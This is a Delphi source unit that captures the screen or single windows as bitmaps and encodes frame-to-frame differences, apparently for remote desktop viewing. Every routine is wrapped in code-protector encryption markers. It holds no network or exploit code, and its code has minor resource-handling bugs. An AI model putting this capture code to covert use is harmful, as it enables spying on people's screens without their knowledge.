unit StreamManager;

interface

uses
Windows,Classes,Graphics;

procedure GetScreenToBmp(DrawCur:Boolean;StreamName:TMemoryStream);
function WindowSnap(windowHandle: HWND): Tbitmap;
procedure GetWindowsToBmp(WinXP:Boolean; Window: HWND; StreamName:TMemoryStream);
procedure CompareStream(MyFirstStream,MySecondStream,MyCompareStream:TMemorystream);
procedure ResumeStream(MyFirstStream,MySecondStream,MyCompareStream:TMemorystream);

implementation

procedure GetScreenToBmp(DrawCur:Boolean;StreamName:TMemoryStream);
var
  Mybmp:Tbitmap;
  Cursorx, Cursory: integer;
  dc: hdc;
  Mycan: Tcanvas;
  R: TRect;
  DrawPos: TPoint;
  MyCursor: TIcon;
  hld: hwnd;
  Threadld: dword;
  mp: tpoint;
  pIconInfo: TIconInfo;
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  Mybmp := Tbitmap.Create;
  Mycan := TCanvas.Create;
  dc := GetWindowDC(0);
  try
    Mycan.Handle := dc;
    R := Rect(0, 0,  GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));
    Mybmp.Width := R.Right;
    Mybmp.Height := R.Bottom;
    Mybmp.Canvas.CopyRect(R, Mycan, R);
  finally
    releaseDC(0, DC);
  end;
  Mycan.Handle := 0;
  Mycan.Free;

  if DrawCur then
  begin
    GetCursorPos(DrawPos);
    MyCursor := TIcon.Create;
    getcursorpos(mp);
    hld := WindowFromPoint(mp);
    Threadld := GetWindowThreadProcessId(hld, nil);
    AttachThreadInput(GetCurrentThreadId, Threadld, True);
    MyCursor.Handle := Getcursor();
    AttachThreadInput(GetCurrentThreadId, threadld, False);
    GetIconInfo(Mycursor.Handle, pIconInfo);
    cursorx := DrawPos.x - round(pIconInfo.xHotspot);
    cursory := DrawPos.y - round(pIconInfo.yHotspot);
    Mybmp.Canvas.Draw(cursorx, cursory, MyCursor);
    DeleteObject(pIconInfo.hbmColor);
    DeleteObject(pIconInfo.hbmMask);
    Mycursor.ReleaseHandle;
    MyCursor.Free;
  end;
  Mybmp.PixelFormat:=pf8bit;
  Mybmp.SaveToStream(StreamName);
  Mybmp.Free;
  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

function WindowSnap(windowHandle: HWND): Tbitmap;
var r: TRect;
    user32DLLHandle: THandle;
    bmp: Tbitmap;
printWindowAPI: function(sourceHandle: HWND; destinationHandle: HDC; nFlags: UINT): BOOL; stdcall;
begin
    // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  user32DLLHandle := GetModuleHandle(user32);
  if user32DLLHandle <> 0 then
  begin
    @printWindowAPI := GetProcAddress(user32DLLHandle,'PrintWindow') ;
    if @printWindowAPI <> nil then
        begin
          GetWindowRect(windowHandle, r) ;
          bmp := TBitmap.Create;
          bmp.Width := r.Right - r.Left;
          bmp.Height := r.Bottom - r.Top;
          bmp.Canvas.Lock;
          try
            printWindowAPI(windowHandle, bmp.Canvas.Handle, 0) ;
          finally
            bmp.Canvas.Unlock;
          end;
          Result := bmp;
        end;
  end;
  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure GetWindowsToBmp(WinXP:Boolean; Window: HWND; StreamName:TMemoryStream);
var
  DC     : HDC;
  Bitmap : Tbitmap;
begin
    // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  Bitmap := Tbitmap.Create;
  if not WinXP then
     begin
       DC := GetDC(Window);
       try
          Bitmap.Width  := GetDevicecaps(DC, HORZRES);
          Bitmap.Height := GetDevicecaps(DC, VERTRES);
          BitBlt(Bitmap.Canvas.Handle, 0, 0, Bitmap.Width, Bitmap.Height, DC, 0,  0, SRCCOPY);
       finally
          ReleaseDC(GetDesktopWindow, DC);
       end;
     end
  else
     Bitmap := WindowSnap(Window);

 Bitmap.PixelFormat := pf8Bit;
 // Result := TMemorystream.Create;
 Bitmap.SaveToStream(StreamName);

 // StreamName.SaveToFile('');
 Bitmap.Free;
   // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure CompareStream(MyFirstStream,MySecondStream,MyCompareStream:TMemorystream);
var
  I: Integer;
  P1, P2, P3: ^Char;
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  MySecondStream.Clear;
  MyCompareStream.Clear;
  GetScreenToBmp(true,MySecondStream);

  P1 := MyFirstStream.Memory;
  P2 := MySecondStream.Memory;
  MyCompareStream.SetSize(MyFirstStream.Size);
  P3 := MyCompareStream.Memory;

  for I := 0 to MyFirstStream.Size - 1 do
  begin
    if P1^ = P2^ then
      P3^ := '0'
    else
      P3^ := P2^;
    Inc(P1);
    Inc(P2);
    Inc(P3);
  end;

  MyFirstStream.Clear;
  MyFirstStream.CopyFrom(MySecondStream,0);
  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

procedure ResumeStream(MyFirstStream,MySecondStream,MyCompareStream:TMemorystream);
var
  I: Integer;
  P1, P2, P3: ^Char;
begin
  // ENCODE_START macro
  asm DB $EB, $10, $57, $4c, $20, $20, $04, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

  P1 := MyFirstStream.Memory;
  MySecondStream.SetSize(MyFirstStream.Size);
  P2 := MySecondStream.Memory;
  P3 := MyCompareStream.Memory;

  for I := 0 to MyFirstStream.Size - 1 do
  begin
    if P3^ = '0' then
      P2^ := p1^
    else
      P2^ := P3^;
    Inc(P1);
    Inc(P2);
    Inc(P3);
  end;

  MyFirstStream.Clear;
  MyFirstStream.CopyFrom(MySecondStream,0);
  MySecondStream.Position:=0;
  // ENCODE_END macro
  asm DB $EB, $10, $57, $4c, $20, $20, $05, $00, $00, $00, $00, $00, $00, $00, $57, $4c, $20, $20 end;

end;

end.
